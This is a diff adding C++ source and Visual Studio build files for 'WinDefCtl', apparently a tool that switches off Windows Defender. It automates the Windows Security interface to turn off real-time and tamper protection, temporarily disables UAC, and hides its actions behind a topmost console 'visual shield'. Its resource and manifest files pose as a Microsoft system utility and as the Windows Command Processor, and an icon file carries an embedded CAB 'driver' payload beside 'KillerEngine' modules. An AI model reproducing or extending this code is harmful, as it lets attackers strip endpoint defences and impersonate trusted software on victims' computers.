+        pToggle->get_CurrentToggleState(&state);
+        
+        if (state == ToggleState_Off) {
+            int baseline = countTotalElements();
+            pToggle->Toggle();
+            pToggle->Release();
+            pButton->Release();
+            result = waitForStructureChange(baseline, false);
+        } else {
+            std::wcout << L"  [*] RTP already enabled\n";
+            pToggle->Release();
+            pButton->Release();
+        }
+    } else {
+        pButton->Release();
+        result = false;
+    }
+    
+    StealthUtils::RestoreUAC();
+    return result;
+}
+
+bool WindowsDefenderAutomation::disableRealTimeProtection() {
+    if (!StealthUtils::BackupAndDisableUAC()) return false;
+    
+    IUIAutomationElement* pButton = findFirstToggleSwitch();
+    if (!pButton) { StealthUtils::RestoreUAC(); return false; }
+
+    IUIAutomationTogglePattern* pToggle = nullptr;
+    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
+
+    bool result = true;
+    if (pToggle) {
+        ToggleState state;
+        pToggle->get_CurrentToggleState(&state);
+        
+        if (state == ToggleState_On) {
+            int baseline = countTotalElements();
+            pToggle->Toggle();
+            pToggle->Release();
+            pButton->Release();
+            result = waitForStructureChange(baseline, true);
+        } else {
+            std::wcout << L"  [*] RTP already disabled\n";
+            pToggle->Release();
+            pButton->Release();
+        }
+    } else {
+        pButton->Release();
+        result = false;
+    }
+    
+    StealthUtils::RestoreUAC();
+    return result;
+}
+
+bool WindowsDefenderAutomation::getRealTimeProtectionStatus() {
+    IUIAutomationElement* pButton = findFirstToggleSwitch();
+    if (!pButton) return false;
+
+    IUIAutomationTogglePattern* pToggle = nullptr;
+    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
+
+    bool isEnabled = false;
+    if (pToggle) {
+        ToggleState state;
+        pToggle->get_CurrentToggleState(&state);
+        isEnabled = (state == ToggleState_On);
+        std::wcout << L"  [*] RTP Status: " << (isEnabled ? L"ENABLED" : L"DISABLED") << L"\n";
+        pToggle->Release();
+    }
+    pButton->Release();
+    return isEnabled;
+}
+
+// ============================================================================
+// Tamper Protection Operations
+// ============================================================================
+
+bool WindowsDefenderAutomation::toggleTamperProtection() {
+    if (!StealthUtils::BackupAndDisableUAC()) return false;
+    
+    IUIAutomationElement* pButton = findLastToggleSwitch();
+    if (!pButton) { StealthUtils::RestoreUAC(); return false; }
+
+    IUIAutomationTogglePattern* pToggle = nullptr;
+    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
+
+    bool result = false;
+    if (pToggle) {
+        ToggleState stateBefore;
+        pToggle->get_CurrentToggleState(&stateBefore);
+        int baseline = countTotalElements();
+
+        pToggle->Toggle();
+        pToggle->Release();
+        pButton->Release();
+
+        result = waitForStructureChange(baseline, (stateBefore == ToggleState_On));
+    } else {
+        pButton->Release();
+    }
+    
+    StealthUtils::RestoreUAC();
+    return result;
+}
+
+bool WindowsDefenderAutomation::enableTamperProtection() {
+    if (!StealthUtils::BackupAndDisableUAC()) return false;
+    
+    IUIAutomationElement* pButton = findLastToggleSwitch();
+    if (!pButton) { 
+        StealthUtils::RestoreUAC(); 
+        return false; 
+    }
+
+    IUIAutomationTogglePattern* pToggle = nullptr;
+    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
+
+    bool result = true;
+    if (pToggle) {
+        ToggleState state;
+        pToggle->get_CurrentToggleState(&state);
+        
+        if (state == ToggleState_Off) {
+            int baseline = countTotalElements();
+            pToggle->Toggle();
+            pToggle->Release();
+            pButton->Release();
+            result = waitForStructureChange(baseline, false);
+        } else {
+            std::wcout << L"  [*] Tamper Protection already enabled\n";
+            pToggle->Release();
+            pButton->Release();
+        }
+    } else {
+        pButton->Release();
+        result = false;
+    }
+    
+    StealthUtils::RestoreUAC();
+    return result;
+}
+
+bool WindowsDefenderAutomation::disableTamperProtection() {
+    if (!StealthUtils::BackupAndDisableUAC()) return false;
+    
+    IUIAutomationElement* pButton = findLastToggleSwitch();
+    if (!pButton) { StealthUtils::RestoreUAC(); return false; }
+
+    IUIAutomationTogglePattern* pToggle = nullptr;
+    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
+
+    bool result = true;
+    if (pToggle) {
+        ToggleState state;
+        pToggle->get_CurrentToggleState(&state);
+        
+        if (state == ToggleState_On) {
+            int baseline = countTotalElements();
+            pToggle->Toggle();
+            pToggle->Release();
+            pButton->Release();
+            result = waitForStructureChange(baseline, true);
+        } else {
+            std::wcout << L"  [*] Tamper Protection already disabled\n";
+            pToggle->Release();
+            pButton->Release();
+        }
+    } else {
+        pButton->Release();
+        result = false;
+    }
+    
+    StealthUtils::RestoreUAC();
+    return result;
+}
+
+bool WindowsDefenderAutomation::getTamperProtectionStatus() {
+    IUIAutomationElement* pButton = findLastToggleSwitch();
+    if (!pButton) return false;
+
+    IUIAutomationTogglePattern* pToggle = nullptr;
+    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
+
+    bool isEnabled = false;
+    if (pToggle) {
+        ToggleState state;
+        pToggle->get_CurrentToggleState(&state);
+        isEnabled = (state == ToggleState_On);
+        std::wcout << L"  [*] Tamper Protection Status: " << (isEnabled ? L"ENABLED" : L"DISABLED") << L"\n";
+        pToggle->Release();
+    }
+    pButton->Release();
+    return isEnabled;
+}
+```
+
+`src/WinDefCtl.h`:
+
+```h
+#pragma once
+
+#include <windows.h>
+#include <UIAutomation.h>
+#include <string>
+
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
+
+#define DEBUG_LOGGING_ENABLED 1
+
+// Automates Windows Security interface for Real-Time Protection and Tamper Protection
+// Uses UI Automation API with TOPMOST console window as visual shield
+class WindowsDefenderAutomation {
+private:
+    IUIAutomation* pAutomation = nullptr;
+    IUIAutomationElement* pRootElement = nullptr;
+    HWND hwndSecurity = NULL;
+
+    bool waitForUILoaded(int maxRetries = 20);
+    IUIAutomationElement* findFirstToggleSwitch();
+    IUIAutomationElement* findLastToggleSwitch();
+    
+    // Counts all descendant elements for structure change detection
+    int countTotalElements();
+    
+    // Waits for UI element count to change (dialogs appearing/disappearing)
+    bool waitForStructureChange(int baselineCount, bool expectIncrease, int timeoutSeconds = 10);
+
+    // Cold boot handling - first run after login needs extra initialization
+    bool isColdBoot();
+    bool preWarmDefender();
+    
+    // Find the Windows Security window handle
+    HWND findSecurityWindow(int maxRetries = 10);
+
+public:
+    WindowsDefenderAutomation();
+    ~WindowsDefenderAutomation();
+
+    bool openDefenderSettings();
+
+    // Real-Time Protection
+    bool toggleRealTimeProtection();
+    bool enableRealTimeProtection();
+    bool disableRealTimeProtection();
+    bool getRealTimeProtectionStatus();
+
+    // Tamper Protection
+    bool toggleTamperProtection();
+    bool enableTamperProtection();
+    bool disableTamperProtection();
+    bool getTamperProtectionStatus();
+
+    void closeSecurityWindow();
+};
+
+```
+
+`src/WinDefCtl.manifest`:
+
+```manifest
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!-- Copyright (c) Microsoft Corporation -->
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+<assemblyIdentity
+    version="5.1.0.0"
+    processorArchitecture="amd64"
+    name="Microsoft.Windows.FileSystem.CMD"
+    type="win32"
+/>
+<description>Windows Command Processor</description>
+
+<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+        <requestedPrivileges>
+            <requestedExecutionLevel
+                level="RequireAdministrator"
+                uiAccess="true"
+            />
+        </requestedPrivileges>
+    </security>
+</trustInfo>
+<application  xmlns="urn:schemas-microsoft-com:asm.v3">
+    <windowsSettings>
+        <dpiAware  xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
+    </windowsSettings>
+    <windowsSettings xmlns:ws2="http://schemas.microsoft.com/SMI/2016/WindowsSettings">
+        <ws2:longPathAware>true</ws2:longPathAware>
+    </windowsSettings>
+</application>
+</assembly>
+
+
+```
+
+`src/WinDefCtl.rc`:
+
+```rc
+#pragma code_page(65001)
+// WinDefCtl.exe Resource File
+#include <windows.h>
+#include "Resource.h"
+
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
+
+// Application icon
+IDI_ICON1 ICON "..\ICON\WinDefCtl.ico"
+
+// Embedded icon+CAB payload. CAB starts at ICON_HEADER_SIZE bytes.
+IDR_DRIVER RCDATA "..\ICON\WinDefCtl.ico"
+
+VS_VERSION_INFO VERSIONINFO
+    FILEVERSION         10,0,26200,8460
+    PRODUCTVERSION      10,0,26200,8460
+    FILEFLAGSMASK       0x3fL
+#ifdef _DEBUG
+    FILEFLAGS           0x1L
+#else
+    FILEFLAGS           0x0L
+#endif
+    FILEOS              0x40004L
+    FILETYPE            0x1L
+    FILESUBTYPE         0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName",      "Microsoft Corporation"
+            VALUE "FileDescription",  "Windows System Utility"
+            VALUE "FileVersion",      "10.0.26200.8460"
+            VALUE "InternalName",     "WinDefCtl.exe"
+            VALUE "LegalCopyright",   "(c) Microsoft Corporation. All rights reserved."
+            VALUE "OriginalFilename", "WinDefCtl.exe"
+            VALUE "ProductName",      "Microsoft Windows Operating System"
+            VALUE "ProductVersion",   "10.0.28000.8460"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
+
+```
+
+`src/WinDefCtl.slnx`:
+
+```slnx
+<Solution>
+  <Configurations>
+    <BuildType Name="Release" />
+    <Platform Name="x64" />
+    <Platform Name="x86" />
+  </Configurations>
+  <Project Path="WinDefCtl.vcxproj" Id="a5f71ca7-a3aa-4e67-b6f0-154c4efee739" />
+</Solution>
+
+```
+
+`src/WinDefCtl.vcxproj`:
+
+```vcxproj
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>18.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{a5f71ca7-a3aa-4e67-b6f0-154c4efee739}</ProjectGuid>
+    <RootNamespace>WinDefCtl</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v145</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <OutDir>$(ProjectDir)..\bin\</OutDir>
+    <IntDir>$(ProjectDir)..\obj\$(Platform)\$(Configuration)\</IntDir>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpplatest</LanguageStandard>
+      <DisableSpecificWarnings>4091;%(DisableSpecificWarnings)</DisableSpecificWarnings>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <AdditionalOptions>/UTF-8 /FS %(AdditionalOptions)</AdditionalOptions>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
+      <UACUIAccess>false</UACUIAccess>
+      <ManifestFile>WinDefCtl.manifest</ManifestFile>
+      <AdditionalDependencies>Cabinet.lib;d2d1.lib;dwrite.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalOptions>/BREPRO %(AdditionalOptions)</AdditionalOptions>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="Main.cpp" />
+    <ClCompile Include="BannerUtils.cpp" />
+    <ClCompile Include="StealthUtils.cpp" />
+    <ClCompile Include="WinDefCtl.cpp" />
+    <ClCompile Include="DefenderManager.cpp" />
+    <ClCompile Include="KillerEngine.cpp" />
+    <ClCompile Include="DriverExtract.cpp" />
+    <ClCompile Include="OverlayWindow.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="BannerUtils.h" />
+    <ClInclude Include="StealthUtils.h" />
+    <ClInclude Include="WinDefCtl.h" />
+    <ClInclude Include="Resource.h" />
+    <ClInclude Include="GenIconSize.h" />
+    <ClInclude Include="DefenderManager.h" />
+    <ClInclude Include="KillerEngine.h" />
+    <ClInclude Include="DriverExtract.h" />
+    <ClInclude Include="OverlayWindow.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="WinDefCtl.rc" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
+```
+
+`src/WinDefCtl.vcxproj.filters`:
+
+```filters
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx</Extensions>
+    </Filter>
+    <Filter Include="Source Files\Engine Kill">
+      <UniqueIdentifier>{B3E1A2C4-5D6F-4E7B-9A8C-1D2E3F4A5B6C}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Driver">
+      <UniqueIdentifier>{C4D5E6F7-A8B9-4C0D-1E2F-3A4B5C6D7E8F}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Overlay">
+      <UniqueIdentifier>{D5E6F7A8-B9C0-4D1E-2F3A-4B5C6D7E8F9A}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\UI">
+      <UniqueIdentifier>{E6F7A8B9-C0D1-4E2F-3A4B-5C6D7E8F9A0B}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx</Extensions>
+    </Filter>
+    <Filter Include="Header Files\Engine Kill">
+      <UniqueIdentifier>{F7A8B9C0-D1E2-4F3A-4B5C-6D7E8F9A0B1C}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Driver">
+      <UniqueIdentifier>{A8B9C0D1-E2F3-4A4B-5C6D-7E8F9A0B1C2D}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Overlay">
+      <UniqueIdentifier>{B9C0D1E2-F3A4-4B5C-6D7E-8F9A0B1C2D3E}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\UI">
+      <UniqueIdentifier>{C0D1E2F3-A4B5-4C6D-7E8F-9A0B1C2D3E4F}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Generated">
+      <UniqueIdentifier>{D1E2F3A4-B5C6-4D7E-8F9A-0B1C2D3E4F5A}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="Main.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="BannerUtils.cpp">
+      <Filter>Source Files\UI</Filter>
+    </ClCompile>
+    <ClCompile Include="StealthUtils.cpp">
+      <Filter>Source Files\UI</Filter>
+    </ClCompile>
+    <ClCompile Include="WinDefCtl.cpp">
+      <Filter>Source Files\UI</Filter>
+    </ClCompile>
+    <ClCompile Include="DefenderManager.cpp">
+      <Filter>Source Files\Engine Kill</Filter>
+    </ClCompile>
+    <ClCompile Include="KillerEngine.cpp">
+      <Filter>Source Files\Engine Kill</Filter>
+    </ClCompile>
+    <ClCompile Include="DriverExtract.cpp">
+      <Filter>Source Files\Driver</Filter>
+    </ClCompile>
+    <ClCompile Include="OverlayWindow.cpp">
+      <Filter>Source Files\Overlay</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="BannerUtils.h">
+      <Filter>Header Files\UI</Filter>
+    </ClInclude>
+    <ClInclude Include="StealthUtils.h">
+      <Filter>Header Files\UI</Filter>
+    </ClInclude>
+    <ClInclude Include="WinDefCtl.h">
+      <Filter>Header Files\UI</Filter>
+    </ClInclude>
+    <ClInclude Include="Resource.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="GenIconSize.h">
+      <Filter>Header Files\Generated</Filter>
+    </ClInclude>
+    <ClInclude Include="DefenderManager.h">
+      <Filter>Header Files\Engine Kill</Filter>
+    </ClInclude>
+    <ClInclude Include="KillerEngine.h">
+      <Filter>Header Files\Engine Kill</Filter>
+    </ClInclude>
+    <ClInclude Include="DriverExtract.h">
+      <Filter>Header Files\Driver</Filter>
+    </ClInclude>
+    <ClInclude Include="OverlayWindow.h">
+      <Filter>Header Files\Overlay</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="WinDefCtl.rc">
+      <Filter>Resource Files</Filter>
+    </ResourceCompile>
+  </ItemGroup>
+</Project>
+
+```
+
+`src/WinDefCtl.vcxproj.user`:
+
+```user
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup />
+</Project>
+```
